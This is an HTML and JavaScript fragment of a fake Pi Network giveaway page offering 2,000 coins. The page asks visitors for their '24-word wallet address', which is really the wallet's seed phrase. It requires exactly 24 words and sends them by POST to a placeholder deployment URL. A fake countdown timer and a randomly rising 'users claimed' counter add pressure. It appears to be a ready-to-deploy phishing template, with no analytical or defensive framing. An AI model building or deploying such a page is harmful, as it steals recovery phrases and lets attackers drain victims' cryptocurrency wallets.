        <h2>Enter Your 24-Word Pi Wallet Address</h2>
        <input type="text" id="wallet" placeholder="Enter your 24-word address">
        <button onclick="submitWallet()">üéÅ Claim Your 2,000 Pi Network Coins</button>
        <p id="response"></p>
        <p id="counter">üî• users have already claimed their reward!</p>
    </div>

    <script>
        let timeLeft = 300;
        function updateTimer() {
            let minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;
            document.getElementById("countdown").innerText = `Time Left: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();

        let participantCount = 182;
        function updateCounter() {
            participantCount += Math.floor(Math.random() * 3) + 3;
            document.getElementById("counter").innerText = `üî• ${participantCount} users have already claimed their reward!`;
            setTimeout(updateCounter, 3000);
        }
        updateCounter();

        async function submitWallet() {
            const wallet = document.getElementById("wallet").value;
            const responseText = document.getElementById("response");
            
            if (!wallet || wallet.split(" ").length !== 24) {
                responseText.innerText = "‚ö†Ô∏è Invalid address. Please enter your full 24-word wallet address.";
                return;
            }
            
            responseText.innerText = "‚è≥ Processing... Please wait.";
            
            const response = await fetch("YOUR_DEPLOYMENT_URL", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ wallet })
            });
            
            const result = await response.json();
            responseText.innerText = result.status === "success" ? "‚úÖ Wallet submitted successfully!" : "‚ùå Error submitting wallet.";
        }
    </script>
